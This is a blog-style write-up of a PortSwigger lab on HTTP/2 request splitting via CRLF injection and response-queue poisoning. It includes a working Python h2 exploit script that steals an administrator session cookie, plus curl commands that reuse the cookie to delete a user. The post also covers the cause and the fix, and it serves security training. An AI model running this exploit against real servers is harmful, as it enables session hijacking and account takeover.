---
layout: post
title: "PortSwigger: HTTP/2 Request Splitting via CRLF Injection"
date: 2027-09-04 09:00:00 -0500
categories: [Web Security, Request Smuggling]
tags: [portswigger, request-smuggling, http2, crlf-injection, desync, downgrade, response-queue-poisoning, session-hijack, web]
---

## Lab Summary

The front-end speaks **HTTP/2** to the browser but downgrades every request to **HTTP/1.1**
for the back-end, and it fails to sanitise raw `\r\n` (CRLF) bytes inside header **values**.
Unlike the TE-hiding variant, here we embed an **entire second request** inside a header value —
no `Transfer-Encoding` involved at all. That splits one HTTP/2 request into two HTTP/1.1 requests,
desynchronises the shared back-end response queue, and lets us capture the administrator's login
response (and session cookie) to take over their account and delete `carlos`.
[CWE-444](https://cwe.mitre.org/data/definitions/444.html) — inconsistent interpretation of HTTP requests.

## Why HTTP/2 makes this possible

The two protocols disagree about what a line break means:

- In **HTTP/1.1**, `\r\n` separates headers and `\r\n\r\n` (a blank line) ends the header block and
  begins the next message. These bytes are structural — they are the message framing.
- In **HTTP/2**, headers are binary key/value pairs. A value may legally contain *any* bytes,
  including `\r\n`, because HTTP/2 frames message length in its binary layer and never uses CRLF
  as a delimiter.

When a front-end downgrades HTTP/2 → HTTP/1.1 it reserialises each header as `name: value\r\n`.
If it doesn't strip CR/LF from the value, those bytes become **real HTTP/1.1 delimiters** on the
back-end. That is the [request-smuggling](https://cwe.mitre.org/data/definitions/444.html) primitive.

## The technique

Send one HTTP/2 `GET /` with a single extra header whose **value** is a whole request:

```
foo: bar\r\n\r\nGET /x HTTP/1.1\r\nHost: <lab-host>
```

On the HTTP/1.1 downgrade the front-end writes it out literally, producing **two** requests:

```
GET / HTTP/1.1
Host: <lab-host>
foo: bar
                      <- the value's \r\n\r\n is a blank line: ENDS the first request
GET /x HTTP/1.1
Host: <lab-host>
                      <- the front-end's own terminating CRLF ENDS the second request
```

The front-end only accounts for one response, so it returns the `GET /` response to us and leaves
the `GET /x` 404 **queued** on the pooled front-end↔back-end connection.

### Response queue poisoning

That orphaned response shifts the queue by one. From then on, every request on that connection
receives the response intended for the *previous* request:

1. We poison the queue with the split request above.
2. The lab's admin bot logs in: `POST /login`. Its real response — a `302` carrying
   `Set-Cookie: session=<admin>` — is handed to whoever reads next.
3. We send a plain `GET /` and receive the admin's `302` with the admin's session cookie.

While poisoned, ordinary polls keep returning `401`/`404` — responses meant for other requests.
That visible mismatch is the live confirmation that the desync is working.

## Solution

`curl` and Burp both refuse to place a raw `\r\n` inside an HTTP/2 header value, so the solve uses
a raw Python `h2` client with header validation disabled. It loops: poison → wait a few seconds →
poll `GET /`, watching for a `302` whose `Location` is `/my-account?id=administrator` (the admin's
login-success redirect).

Create `poison.py`:

```python
import socket, ssl, time, re
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, StreamEnded

HOST = "<lab-host>"
cfg = H2Configuration(client_side=True, header_encoding="utf-8",
    validate_outbound_headers=False, normalize_outbound_headers=False)
ctx = ssl.create_default_context(); ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE; ctx.set_alpn_protocols(["h2"])

def req(t, h, hdrs):
    sid = h.get_next_available_stream_id()
    h.send_headers(sid, hdrs, end_stream=True); t.sendall(h.data_to_send())
    t.settimeout(6); st = None; ck = []
    try:
        while True:
            d = t.recv(65535)
            if not d: break
            for e in h.receive_data(d):
                if isinstance(e, ResponseReceived) and e.stream_id == sid:
                    for k, v in e.headers:
                        if k == ":status": st = v
                        elif k.lower() == "set-cookie": ck.append(v)
                elif isinstance(e, StreamEnded) and e.stream_id == sid:
                    raise StopIteration
    except Exception:
        pass
    return st, ck

split = [(":method","GET"),(":path","/"),(":scheme","https"),(":authority",HOST),
         ("foo", "bar\r\n\r\nGET /x HTTP/1.1\r\nHost: " + HOST)]
plain = [(":method","GET"),(":path","/"),(":scheme","https"),(":authority",HOST)]

for i in range(60):
    t = ctx.wrap_socket(socket.create_connection((HOST,443),timeout=15), server_hostname=HOST)
    h = H2Connection(config=cfg); h.initiate_connection(); t.sendall(h.data_to_send())
    req(t, h, split)              # poison the response queue
    time.sleep(4)                 # let the admin bot land
    st, ck = req(t, h, plain)     # fetch a queued response
    t.close()
    print(i, st, ck)
    for c in ck:
        m = re.search(r"session=([A-Za-z0-9]+)", c)
        if m and st == "302":
            print("ADMIN_SESSION", m.group(1)); raise SystemExit
```

Run it and watch for the login `302`:

```
2 302 ['session=<admin-session>; Secure; HttpOnly; SameSite=None']
```

Then **stop the script** and replay the captured session over a clean HTTP/2 connection:

```bash
curl -sk --http2 "https://<lab-host>/admin" -b "session=<admin-session>"
curl -sk --http2 "https://<lab-host>/admin/delete?username=carlos" -b "session=<admin-session>"
```

The first returns the admin panel (`200`), the second returns `302` — `carlos` deleted, lab **Solved**.

## Why it worked

HTTP/2 carries header values as opaque bytes, so CR/LF inside a value is valid on the wire. A
downgrading proxy that doesn't strip them turns them into HTTP/1.1 delimiters, splitting one
request into two. The back-end then answers more requests than the front-end expects, so the
shared response queue is permanently offset — and the admin's authenticated response is delivered
to the attacker.

> **The gotcha that wastes time:** do **not** test the stolen session while the poison loop is
> still running. A verify request that lands on a still-poisoned connection gets a *displaced*
> response (a `401` "admin interface only", or the home search page) and the perfectly-valid admin
> session looks like it failed. Stop all poisoning first, then test — the same cookie returns the
> real panel. Also remember anonymous `200`/`404` polls *also* set fresh session cookies for new
> visitors, so filter on the `302` status and the `/my-account?id=administrator` location, not on
> the mere presence of a cookie.

## Fix / defense

The front-end must treat CR, LF and NUL as illegal in HTTP/2 header **names and values** and
reject such requests during the downgrade ([RFC 9113 §8.2.1](https://www.rfc-editor.org/rfc/rfc9113.html#section-8.2.1)),
or avoid the downgrade entirely by speaking HTTP/2 end-to-end. Never reserialise untrusted header
bytes into a protocol where those bytes are message delimiters.
